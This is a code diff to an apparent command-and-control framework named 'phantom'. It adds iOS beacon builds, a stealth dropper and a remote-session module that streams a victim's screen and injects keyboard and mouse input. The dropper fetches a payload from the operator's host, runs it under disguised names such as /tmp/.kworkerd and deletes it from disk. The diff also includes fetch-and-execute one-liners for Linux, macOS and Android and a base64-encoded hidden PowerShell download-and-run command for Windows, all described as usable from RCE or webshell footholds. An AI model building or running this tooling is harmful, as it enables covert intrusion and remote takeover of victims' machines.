@@ -5,6 +5,7 @@ import shutil
 import base64
 import struct
 import subprocess
+import sys
 from typing import Optional
 from rich.console import Console
 from phantom.utils.notifier import notifier
@@ -22,6 +23,10 @@ _PLATFORM_OUT = {
     "linux": "beacon_linux",
     "macos": "beacon_macos",
     "android": "beacon_android",
+    # iOS: a dylib injected into an MDM-pushed, enterprise-signed app; a
+    # standalone Mach-O cannot execute on a non-jailbroken device. Builds
+    # only on macOS + Xcode (see check_build_env), delivered via MDM.
+    "ios": "beacon_ios.dylib",
     "linux32": "beacon_linux_x86",
 }
 
@@ -621,6 +626,45 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
             notifier.error(f"macOS compilation failed:\n{e.stderr}")
             return None
 
+    elif platform == "ios":
+        # check_build_env() already enforced macOS + Xcode + iOS SDK. The
+        # implant is a dylib: on a non-jailbroken device it only runs when
+        # loaded inside an enterprise-signed app pushed by MDM.
+        console.print("[yellow][*] Compiling beacon for iOS (dylib, "
+                      "arm64)...[/yellow]")
+        dev_sdk = os.environ.get(
+            "IOS_DEV_SDK",
+            "/Applications/Xcode.app/Contents/Developer/Platforms/"
+            "iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk")
+        if not os.path.isdir(dev_sdk):
+            try:
+                dev_sdk = subprocess.run(
+                    ["xcrun", "--sdk", "iphoneos", "--show-sdk-path"],
+                    capture_output=True, text=True, timeout=30).stdout.strip()
+            except Exception:
+                dev_sdk = ""
+        if not dev_sdk or not os.path.isdir(dev_sdk):
+            notifier.error("iOS SDK path not found (set IOS_DEV_SDK).")
+            return None
+        try:
+            subprocess.run(
+                ["xcrun", "-sdk", "iphoneos", "clang++", "-std=c++20",
+                 "-O2", "-fPIC", "-shared", "-dynamiclib", "-arch", "arm64",
+                 "-o", out_name,
+                 "-Isrc", "src/main.cpp",
+                 f"-isysroot{dev_sdk}",
+                 "-framework", "Foundation", "-framework", "Security",
+                 "-lssl", "-lcrypto"],
+                cwd=beacon_dir, check=True, capture_output=True, text=True,
+                timeout=1200)
+            _mark_built(beacon_dir, out_name)
+            console.print("[green][+] iOS dylib built — push via MDM as an "
+                          "enterprise-signed app payload.[/green]")
+            return beacon_out
+        except subprocess.CalledProcessError as e:
+            notifier.error(f"iOS compilation failed:\n{e.stderr}")
+            return None
+
     elif platform == "android":
         console.print("[yellow][*] Compiling beacon for Android (NDK)...[/yellow]")
         ndk_home = os.environ.get("ANDROID_NDK_HOME", "/opt/android-ndk")
@@ -743,5 +787,398 @@ def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", d
     elif platform == "android":
         beac_url = f"{proto}://{lhost}:{dl_port}/api/v1/payload_android?{token_param}"
         return f"curl -sk '{beac_url}' -o $TMPDIR/.x && chmod +x $TMPDIR/.x && $TMPDIR/.x {lhost} {lport} {1 if use_ssl else 0}"
+
+    return ""
+
+
+def generate_stealth_dropper(platform: str, lhost: str, lport: int,
+                             dl_port: int = None, use_ssl: bool = True) -> str:
+    """No-disk, self-deleting stager.
+
+    Windows: the PIC stager already runs the beacon **purely in memory** (the
+    PE/shellcode never touches disk) — delegated to generate_dropper.
+    Linux/macOS/Android: the payload is fetched to a temp path, started, then
+    UNLINKED immediately, so no readable file remains on disk (only the
+    running inode, which the kernel frees on exit). The downloaded launcher
+    itself is the one artifact a browser drop leaves; running this removes the
+    payload copy right away.
+    """
+    if dl_port is None:
+        dl_port = lport
+    proto = "https" if use_ssl else "http"
+    from phantom.utils.c2_crypto import get_payload_token
+    token_param = f"auth={get_payload_token()}"
+    ssl_flag = 1 if use_ssl else 0
+
+    if platform == "windows":
+        # in-memory PIC: nothing to delete on the beacon side
+        return generate_dropper(platform, lhost, lport, arch="x64",
+                                dl_port=dl_port, use_ssl=use_ssl)
+
+    if platform in ("linux", "macos"):
+        path = "payload_linux" if platform == "linux" else "payload_macos"
+        url = f"{proto}://{lhost}:{dl_port}/api/v1/{path}?{token_param}"
+        tmp = "/tmp/.kworkerd" if platform == "linux" else "/tmp/.com.apple.helper"
+        # fetch -> chmod -> start in background -> unlink the on-disk copy.
+        # The process keeps running from the unlinked inode; nothing readable
+        # remains on disk once the 1s window has elapsed.
+        return (f"curl -sk '{url}' -o {tmp} && chmod +x {tmp} && "
+                f"nohup {tmp} {lhost} {lport} {ssl_flag} >/dev/null 2>&1 & "
+                f"sleep 1; rm -f {tmp}; true")
+
+    if platform == "android":
+        url = f"{proto}://{lhost}:{dl_port}/api/v1/payload_android?{token_param}"
+        # install from the temp APK, launch, then delete the temp copy
+        return (f"curl -sk '{url}' -o /data/local/tmp/.srv.apk && "
+                f"pm install -g /data/local/tmp/.srv.apk >/dev/null 2>&1 && "
+                f"am start -n com.phantom.remote/.MainActivity >/dev/null 2>&1; "
+                f"rm -f /data/local/tmp/.srv.apk; true")
+
+    return ""
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  Remote Session Module (GUI takeover) — compile + dropper
+# ═══════════════════════════════════════════════════════════════════════════
+#  A standalone companion binary (phantom/payloads/remote) that registers as
+#  its own beacon (R-…) on the same C2, streams the victim's screen as JPEG
+#  frames over the beacon channel, and injects mouse/keyboard input with
+#  configurable stealth modes. Built independently of the beacon so it can be
+#  dropped via RCE/cmdi, launched by the beacon's `remote` command, or
+#  compiled separately for later use.
+
+_REMOTE_OUT = {
+    "windows": "remote.exe",
+    "linux": "remote_linux",
+    "macos": "remote_macos",
+    # Android ships as an APK (MediaProjection + AccessibilityService need a
+    # real app, not a plain NDK binary) but speaks the same C2 protocol.
+    "android": "remote.apk",
+    # iOS remote session: an in-process dylib (ReplayKit + UIKit event
+    # injection) loaded into a signed app — macOS + Xcode build only.
+    "ios": "remote_ios.dylib",
+}
+
+
+def _remote_identity(remote_dir: str) -> str:
+    """Enroll a dedicated R-… identity for the remote module build."""
+    from phantom.utils.beacon_auth import write_beacon_auth_config
+    beacon_id = "R-" + secrets.token_hex(8).upper()
+    path = write_beacon_auth_config(remote_dir, beacon_id=beacon_id)
+    return beacon_id
+
+
+def compile_remote(platform: str, pkg_root: str, force_rebuild: bool = False,
+                   host: str = "127.0.0.1", port: int = 8080,
+                   use_ssl: bool = True) -> Optional[str]:
+    """Compile the standalone remote-session module for a platform.
+
+    Unlike the beacon (PIC/reflective), this is a plain PE/ELF that speaks
+    the same C2 wire protocol — simpler to build, intentionally separate
+    from the beacon's evasion stack (it is dropped AFTER a foothold).
+    Returns the binary path or None.
+    """
+    if platform not in _REMOTE_OUT:
+        notifier.error(f"Remote module unsupported on: {platform}")
+        return None
+
+    remote_dir = os.path.abspath(os.path.join(pkg_root, "payloads", "remote"))
+    src_dir = os.path.join(remote_dir, "src")
+    out_name = _REMOTE_OUT[platform]
+    out_path = os.path.join(remote_dir, out_name)
+
+    if not force_rebuild and os.path.exists(out_path):
+        return out_path
+
+    # Identity + crypto + C2 config for THIS build (fresh per build).
+    _remote_identity(remote_dir)
+    write_beacon_crypto_config(remote_dir)
+    write_beacon_c2_config(remote_dir, host=host, port=port, use_ssl=use_ssl)
+
+    main_cpp = os.path.join(src_dir, "main.cpp")
+
+    if platform == "windows":
+        import shutil as _sh
+        def _find_tool(names):
+            for name in names:
+                p = _sh.which(name)
+                if p:
+                    return p
+            return None
+        mingw_cpp = _find_tool(["x86_64-w64-mingw32-g++", "g++"])
+        if not mingw_cpp:
+            notifier.error("No MinGW C++ compiler found for the remote module.")
+            return None
+        cmd = [mingw_cpp, "-std=c++20", "-O2", "-s", "-static", "-mwindows",
+               "-o", out_path,
+               f"-I{src_dir}",
+               main_cpp,
+               "-lwinhttp", "-lbcrypt", "-lws2_32", "-lgdi32", "-luser32",
+               "-lgdiplus", "-lole32", "-lwtsapi32", "-liphlpapi", "-lcrypt32"]
+        try:
+            subprocess.run(cmd, check=True, capture_output=True, text=True,
+                           timeout=600)
+            notifier.success(f"Remote module built: {out_path}")
+            return out_path
+        except subprocess.CalledProcessError as e:
+            notifier.error(f"Remote (Windows) build failed:\n{e.stderr[-2000:]}")
+            return None
+
+    elif platform == "linux":
+        # Windows host: compile inside the Kali WSL distro (same as beacon).
+        wsl_prefix: list = []
+        wsl_dir = ""
+        if os.name == "nt":
+            from phantom.utils.build_helper import _wsl_cmd
+            wsl_prefix = _wsl_cmd(["true"])
+            if wsl_prefix:
+                wsl_prefix = wsl_prefix[:-1]
+                wsl_dir = _wsl_path(remote_dir)
+                src_inc = f"-I{wsl_dir}/src"
+        else:
+            src_inc = f"-I{src_dir}"
+
+        cmd = ["g++", "-std=c++20", "-O2", "-s", "-static",
+               "-o", out_name, src_inc, "src/main.cpp",
+               "-lssl", "-lcrypto", "-lzstd", "-lz", "-lpthread", "-ldl"]
+        if wsl_prefix:
+            fixed = []
+            skip = False
+            for part in cmd:
+                if skip:
+                    fixed.append(f"{wsl_dir}/{part}")
+                    skip = False
+                elif part == "-o":
+                    fixed.append(part)
+                    skip = True
+                elif part == "src/main.cpp":
+                    fixed.append(f"{wsl_dir}/src/main.cpp")
+                else:
+                    fixed.append(part)
+            try:
+                subprocess.run(wsl_prefix + fixed, check=True,
+                               capture_output=True, text=True, timeout=600)
+            except subprocess.CalledProcessError as e:
+                notifier.error(f"Remote (Linux/WSL) build failed:\n{e.stderr[-2000:]}")
+                return None
+        else:
+            try:
+                subprocess.run(cmd, cwd=remote_dir, check=True,
+                               capture_output=True, text=True, timeout=600)
+            except subprocess.CalledProcessError as e:
+                notifier.error(f"Remote (Linux) build failed:\n{e.stderr[-2000:]}")
+                return None
+        notifier.success(f"Remote module built: {out_path}")
+        return out_path
+
+    elif platform == "macos":
+        osxcross_root = os.environ.get("OSXCROSS_ROOT", "/opt/osxcross")
+        o32_cc = os.path.join(osxcross_root, "bin", "o32-clang++")
+        if not os.path.exists(o32_cc):
+            notifier.error(f"osxcross compiler not found at {o32_cc}")
+            return None
+        try:
+            subprocess.run(
+                [o32_cc, "-std=c++20", "-O2", "-o", out_name,
+                 f"-I{src_dir}", "src/main.cpp",
+                 "-lcurl", "-lssl", "-lcrypto", "-lpthread"],
+                cwd=remote_dir, check=True, capture_output=True, text=True,
+                timeout=600)
+            notifier.success(f"Remote module built: {out_path}")
+            return out_path
+        except subprocess.CalledProcessError as e:
+            notifier.error(f"Remote (macOS) build failed:\n{e.stderr[-2000:]}")
+            return None
+
+    elif platform == "android":
+        return _compile_remote_android(remote_dir, out_path, notifier)
+
+    elif platform == "ios":
+        return _compile_remote_ios(remote_dir, out_path, notifier)
+
+    return None
+
+
+def _compile_remote_ios(remote_dir: str, out_path: str, notifier) -> Optional[str]:
+    """Build the iOS remote-session module (dylib) on macOS with Xcode.
+
+    Honest failure, never a fake success: an iOS remote module is a dylib
+    loaded inside an enterprise-signed, MDM-pushed app (ReplayKit capture +
+    UIKit synthetic events). Without macOS + Xcode + the iOS SDK it cannot
+    exist, and there is no cross-toolchain that produces a runnable one.
+    """
+    if os.name != "posix" or sys.platform != "darwin":
+        notifier.error("iOS remote builds require macOS + Xcode (no cross-toolchain).")
+        notifier.info("Build on a Mac, sign with an enterprise identity, deliver via MDM.")
+        return None
+    import shutil as _sh
+    if not _sh.which("xcrun"):
+        notifier.error("'xcrun' not found — install Xcode command line tools.")
+        return None
+    src_dir = os.path.join(remote_dir, "src")
+    ios_src = os.path.join(remote_dir, "ios")
+    if not os.path.isdir(ios_src):
+        notifier.error("iOS remote sources are missing (payloads/remote/ios).")
+        return None
+    sdk = os.environ.get(
+        "IOS_DEV_SDK",
+        "/Applications/Xcode.app/Contents/Developer/Platforms/"
+        "iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk")
+    if not os.path.isdir(sdk):
+        try:
+            sdk = subprocess.run(
+                ["xcrun", "--sdk", "iphoneos", "--show-sdk-path"],
+                capture_output=True, text=True, timeout=30).stdout.strip()
+        except Exception:
+            sdk = ""
+    if not sdk or not os.path.isdir(sdk):
+        notifier.error("iOS SDK path not found (set IOS_DEV_SDK).")
+        return None
+    try:
+        subprocess.run(
+            ["xcrun", "-sdk", "iphoneos", "clang++", "-std=c++20",
+             "-O2", "-fPIC", "-shared", "-dynamiclib", "-arch", "arm64",
+             "-o", out_path,
+             f"-I{src_dir}", f"-I{ios_src}",
+             os.path.join(ios_src, "main.mm"),
+             f"-isysroot{sdk}",
+             "-framework", "Foundation", "-framework", "UIKit",
+             "-framework", "ReplayKit"],
+            cwd=remote_dir, check=True, capture_output=True, text=True,
+            timeout=1200)
+        notifier.success(f"iOS remote module built: {out_path}")
+        return out_path
+    except subprocess.CalledProcessError as e:
+        notifier.error(f"Remote (iOS) build failed:\n{e.stderr[-2000:]}")
+        return None
+
+
+def _compile_remote_android(remote_dir: str, out_path: str, notifier) -> Optional[str]:
+    """Build the Android remote module (APK) with Gradle + the NDK.
+
+    Returns the APK path or None. The APK embeds the native bridge that reuses
+    remote_net.h, so it is wire-compatible with the desktop remote module.
+
+    Tooling requirements (honest failure, never a fake success):
+      * ANDROID_NDK_HOME / ANDROID_SDK_ROOT (or ANDROID_HOME) set
+      * a `gradle` on PATH or the project's ./gradlew wrapper
+    """
+    android_dir = os.path.join(remote_dir, "android")
+    if not os.path.isdir(android_dir):
+        notifier.error("Android remote sources are missing (payloads/remote/android).")
+        return None
+
+    ndk_home = os.environ.get("ANDROID_NDK_HOME", "")
+    sdk_home = (os.environ.get("ANDROID_SDK_ROOT")
+                or os.environ.get("ANDROID_HOME", ""))
+    if not ndk_home or not os.path.isdir(ndk_home):
+        notifier.error("ANDROID_NDK_HOME is not set (required for the native bridge).")
+        notifier.info("Install the Android NDK and export ANDROID_NDK_HOME=/path/to/ndk.")
+        return None
+    if not sdk_home or not os.path.isdir(sdk_home):
+        notifier.error("ANDROID_SDK_ROOT is not set (required for Gradle).")
+        notifier.info("Install the Android SDK and export ANDROID_SDK_ROOT=/path/to/sdk.")
+        return None
+
+    import shutil as _sh
+    gradlew = os.path.join(android_dir, "gradlew")
+    if os.name != "nt" and os.path.exists(gradlew):
+        gradle_cmd = [gradlew, "assembleRelease", "--no-daemon"]
+    else:
+        gradle_bin = _sh.which("gradle") or _sh.which("gradle.bat")
+        if not gradle_bin:
+            notifier.error("No `gradle` found on PATH (and no ./gradlew wrapper).")
+            return None
+        gradle_cmd = [gradle_bin, "assembleRelease", "--no-daemon"]
+
+    local_props = os.path.join(android_dir, "local.properties")
+    try:
+        with open(local_props, "w", encoding="utf-8") as f:
+            f.write(f"sdk.dir={sdk_home.replace(chr(92), '/')}\n")
+    except OSError as e:
+        notifier.error(f"Cannot write local.properties: {e}")
+        return None
+
+    env = dict(os.environ)
+    env["ANDROID_NDK_HOME"] = ndk_home
+    env["ANDROID_SDK_ROOT"] = sdk_home
+    env["REMOTE_SRC_DIR"] = os.path.join(remote_dir, "src")
+
+    try:
+        subprocess.run(gradle_cmd, cwd=android_dir, env=env, check=True,
+                       capture_output=True, text=True, timeout=1800)
+    except subprocess.CalledProcessError as e:
+        notifier.error(f"Remote (Android) build failed:\n{(e.stderr or '')[-2000:]}")
+        return None
+    except FileNotFoundError as e:
+        notifier.error(f"Remote (Android) build tool missing: {e}")
+        return None
+
+    produced = os.path.join(
+        android_dir, "app", "build", "outputs", "apk", "release", "app-release.apk")
+    if not os.path.exists(produced):
+        notifier.error("Gradle finished but no release APK was produced.")
+        return None
+    try:
+        _sh.copyfile(produced, out_path)
+    except OSError as e:
+        notifier.error(f"Cannot copy APK: {e}")
+        return None
+    notifier.success(f"Remote module built: {out_path}")
+    return out_path
+
+
+def _wsl_path(p: str) -> str:
+    p = os.path.abspath(p)
+    drive, rest = p[0].lower(), p[2:].replace("\\", "/")
+    return f"/mnt/{drive}{rest}"
+
+
+def generate_remote_dropper(platform: str, lhost: str, lport: int,
+                            use_ssl: bool = True) -> str:
+    """One-liner that downloads and runs the compiled remote module.
+
+    Serves the same role as the beacon dropper but for the remote module:
+    a disposable fetch+exec chain usable from RCE/cmdi/webshell contexts.
+    The module takes (host port use_https) as argv, so the compiled binary
+    can be pointed at any listener at drop time.
+    """
+    proto = "https" if use_ssl else "http"
+    from phantom.utils.c2_crypto import get_payload_token
+    token_param = f"auth={get_payload_token()}"
+
+    if platform == "windows":
+        url = f"{proto}://{lhost}:{lport}/api/v1/remote_payload_windows?{token_param}"
+        ps = (
+            "$p=[Net.ServicePointManager]::ServerCertificateValidationCallback;"
+            "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
+            "$d=[IO.Path]::Combine($env:TEMP,'srv'+(Get-Random)+'.exe');"
+            "(New-Object Net.WebClient).DownloadFile('" + url + "',$d);"
+            "[Net.ServicePointManager]::ServerCertificateValidationCallback=$p;"
+            "Start-Process $d"
+        )
+        b64_ps = base64.b64encode(ps.encode('utf-16-le')).decode()
+        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64_ps}"
+
+    if platform == "linux":
+        url = f"{proto}://{lhost}:{lport}/api/v1/remote_payload_linux?{token_param}"
+        return (f"curl -sk '{url}' -o /tmp/.rdesk && chmod +x /tmp/.rdesk && "
+                f"nohup /tmp/.rdesk {lhost} {lport} {1 if use_ssl else 0} "
+                f"&>/dev/null &")
+
+    if platform == "macos":
+        url = f"{proto}://{lhost}:{lport}/api/v1/remote_payload_macos?{token_param}"
+        return (f"curl -sk '{url}' -o /tmp/.rdesk && chmod +x /tmp/.rdesk && "
+                f"nohup /tmp/.rdesk {lhost} {lport} {1 if use_ssl else 0} "
+                f"&>/dev/null &")
+
+    if platform == "android":
+        # Fetch + install the APK and launch its bootstrap activity. Delivery
+        # requires an existing shell (adb / RCE / beacon): the APK cannot
+        # install itself — that is a platform security boundary, not a bug.
+        url = f"{proto}://{lhost}:{lport}/api/v1/remote_payload_android?{token_param}"
+        return (f"curl -sk '{url}' -o /data/local/tmp/.srv.apk && "
+                f"pm install -g /data/local/tmp/.srv.apk && "
+                f"am start -n com.phantom.remote/.MainActivity")
 
     return ""
